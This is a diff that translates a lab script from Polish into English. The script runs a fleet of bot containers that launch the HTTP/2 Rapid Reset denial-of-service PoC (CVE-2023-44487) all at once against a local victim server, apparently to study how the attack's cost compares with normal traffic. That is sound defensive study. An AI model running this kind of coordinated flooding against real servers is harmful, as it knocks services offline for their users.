@@ -1,29 +1,29 @@
 #!/usr/bin/env bash
 # =============================================================================
-# Zarzadzanie flota botow TEGO labu (jedno polecenie = postaw / odpal / zatrzymaj
-# atak na wszystkich botach naraz). Boty MAJA JUZ WGRANY PoC `rapidreset`
-# wbudowany na etapie budowania obrazu (bot/Dockerfile) - ten skrypt niczego
-# nie wgrywa w trakcie dzialania, tylko steruje gotowymi kontenerami.
+# Management of THIS lab's bot fleet (one command = deploy / launch / stop
+# attack on all bots at once). Bots ALREADY HAVE the PoC `rapidreset`
+# built-in at image build time (bot/Dockerfile) - this script does not
+# deploy anything at runtime, it only controls ready containers.
 #
-# GRANICA: zarzadza wylacznie flota WLASNYCH, z gory zbudowanych kontenerow
-# tego labu. Brak jakiegokolwiek mechanizmu dystrybucji/implantacji ataku na
-# urzadzenia, ktore go jeszcze nie maja (to swiadomie poza zakresem).
+# BOUNDARY: manages only the fleet of OWN, pre-built containers of this lab.
+# No mechanism for distribution/implantation of the attack to devices that
+# don't already have it (this is intentionally out of scope).
 #
-# Komendy:
-#   up [N]              postaw flote N botow + bazowy lab (domyslnie N=5)
-#   fire [opcje]         odpal ruch NA WSZYSTKICH botach floty jednoczesnie
+# Commands:
+#   up [N]              deploy a fleet of N bots + base lab (default N=5)
+#   fire [options]       launch traffic on ALL fleet bots simultaneously
 #       --mode attack|legit  attack = rapidreset (HEADERS+RST_STREAM, PoC CVE-2023-44487)
-#                            legit  = h2load (kompletne zadania HTTP/2 - ruch imitujacy
-#                                     normalnego klienta, do porownania asymetrii kosztu)
-#                            (domyslnie attack)
-#       --requests N      zadan/strumieni na bota (domyslnie 20000)
-#       --concurrency N   rownoczesnych workerow/polaczen na bota (domyslnie 200)
-#       --duration S       >0: petla przez S sekund (domyslnie 0 = jednorazowo)
-#   stop                 zatrzymaj ruch na wszystkich botach (pkill rapidreset + h2load)
-#   status               tabela: ktory bot w jakim trybie + CPU/polaczenia ofiary
-#   down                  zdejmij flote (zachowuje bazowy lab)
+#                            legit  = h2load (complete HTTP/2 requests - traffic imitating
+#                                     a normal client, for cost asymmetry comparison)
+#                            (default attack)
+#       --requests N      requests/streams per bot (default 20000)
+#       --concurrency N   concurrent workers/connections per bot (default 200)
+#       --duration S       >0: loop for S seconds (default 0 = one-shot)
+#   stop                 stop traffic on all bots (pkill rapidreset + h2load)
+#   status               table: which bot in which mode + victim CPU/connections
+#   down                  take down the fleet (keeps the base lab)
 #
-# Przyklady:
+# Examples:
 #   bash scenarios/botnet-fleet.sh up 5
 #   bash scenarios/botnet-fleet.sh fire --mode attack --requests 20000 --concurrency 300
 #   bash scenarios/botnet-fleet.sh fire --mode legit  --requests 2000  --concurrency 20 --duration 30
@@ -45,16 +45,16 @@ fleet_ids() { dc ps -q botfleet 2>/dev/null; }
 
 cmd_up() {
   local n="${1:-5}"
-  echo "[*] Stawiam baze + flote botfleet=$n ..."
+  echo "[*] Deploying base + fleet botfleet=$n ..."
   dc up -d --build --scale "botfleet=$n"
-  echo "[*] Czekam na victim (HTTP/2) ..."
+  echo "[*] Waiting for victim (HTTP/2) ..."
   for _ in $(seq 1 30); do
     dc exec -T loadgen curl -sk --max-time 2 https://victim/ -o /dev/null && { echo "[*] victim OK"; break; }
     sleep 1
   done
   local ids; ids="$(fleet_ids)"
   local count; count="$(echo "$ids" | grep -c . || true)"
-  echo "[*] Flota gotowa: $count botow"
+  echo "[*] Fleet ready: $count bots"
 }
 
 cmd_fire() {
@@ -65,19 +65,19 @@ cmd_fire() {
       --requests)    req="$2"; shift ;;
       --concurrency) conc="$2"; shift ;;
       --duration)    dur="$2"; shift ;;
-      *) echo "Nieznana opcja fire: $1" >&2; exit 2 ;;
+      *) echo "Unknown fire option: $1" >&2; exit 2 ;;
     esac
     shift
   done
-  case "$mode" in attack|legit) ;; *) echo "Nieznany --mode: $mode (attack|legit)" >&2; exit 2 ;; esac
+  case "$mode" in attack|legit) ;; *) echo "Unknown --mode: $mode (attack|legit)" >&2; exit 2 ;; esac
 
   local ids; ids="$(fleet_ids)"
   if [ -z "$ids" ]; then
-    echo "[!] Flota nie istnieje. Odpal najpierw:  bash scenarios/botnet-fleet.sh up [N]" >&2
+    echo "[!] Fleet does not exist. Run first:  bash scenarios/botnet-fleet.sh up [N]" >&2
     exit 1
   fi
   local count; count="$(echo "$ids" | wc -l | tr -d ' ')"
-  echo "[*] Odpalam ruch '$mode' na $count botach jednoczesnie (requests=$req concurrency=$conc duration=${dur}s) ..."
+  echo "[*] Launching '$mode' traffic on $count bots simultaneously (requests=$req concurrency=$conc duration=${dur}s) ..."
 
   local single
   if [ "$mode" = "attack" ]; then
@@ -95,29 +95,29 @@ cmd_fire() {
     fi
   done
   wait
-  echo "[*] Ruch '$mode' wystartowany na wszystkich botach floty (tlo kontenerow)."
-  [ "$dur" -eq 0 ] && echo "[*] Tryb jednorazowy — sprawdz 'status' za chwile, sam sie zakonczy."
-  [ "$dur" -gt 0 ] && echo "[*] Tryb ciagly na ${dur}s — uzyj 'stop' aby przerwac wczesniej."
+  echo "[*] Traffic '$mode' started on all fleet bots (container background)."
+  [ "$dur" -eq 0 ] && echo "[*] One-shot mode — check 'status' in a moment, it will finish on its own."
+  [ "$dur" -gt 0 ] && echo "[*] Continuous mode for ${dur}s — use 'stop' to interrupt earlier."
 }
 
 cmd_stop() {
   local ids; ids="$(fleet_ids)"
-  [ -z "$ids" ] && { echo "[!] Flota nie istnieje."; exit 1; }
-  echo "[*] Zatrzymuje ruch (attack + legit) na wszystkich botach ..."
+  [ -z "$ids" ] && { echo "[!] Fleet does not exist."; exit 1; }
+  echo "[*] Stopping traffic (attack + legit) on all bots ..."
   for cid in $ids; do
     docker exec "$cid" sh -c 'pkill rapidreset 2>/dev/null; pkill h2load 2>/dev/null; exit 0'
   done
-  echo "[*] Zatrzymano."
+  echo "[*] Stopped."
 }
 
 cmd_status() {
   local ids; ids="$(fleet_ids)"
   if [ -z "$ids" ]; then
-    echo "[!] Flota nie istnieje (odpal 'up' najpierw)."
+    echo "[!] Fleet does not exist (run 'up' first)."
     exit 1
   fi
-  echo "--- Flota botow ---"
-  printf "%-16s %-8s\n" "KONTENER" "TRYB"
+  echo "--- Bot fleet ---"
+  printf "%-16s %-8s\n" "CONTAINER" "MODE"
   local active=0 total=0
   for cid in $ids; do
     total=$((total+1))
@@ -133,16 +133,16 @@ cmd_status() {
     fi
   done
   echo "-------------------"
-  echo "Aktywnych: $active / $total"
+  echo "Active: $active / $total"
   echo
-  echo "--- Ofiara (stub_status) ---"
-  dc exec -T loadgen curl -sk --max-time 3 https://victim/status 2>/dev/null || echo "(brak odpowiedzi)"
+  echo "--- Victim (stub_status) ---"
+  dc exec -T loadgen curl -sk --max-time 3 https://victim/status 2>/dev/null || echo "(no response)"
 }
 
 cmd_down() {
-  echo "[*] Zdejmuje flote botfleet (zachowuje bazowy lab) ..."
+  echo "[*] Taking down fleet botfleet (keeping base lab) ..."
   dc up -d --scale botfleet=0 2>/dev/null
-  echo "[*] Gotowe."
+  echo "[*] Done."
 }
 
 case "${1:-}" in
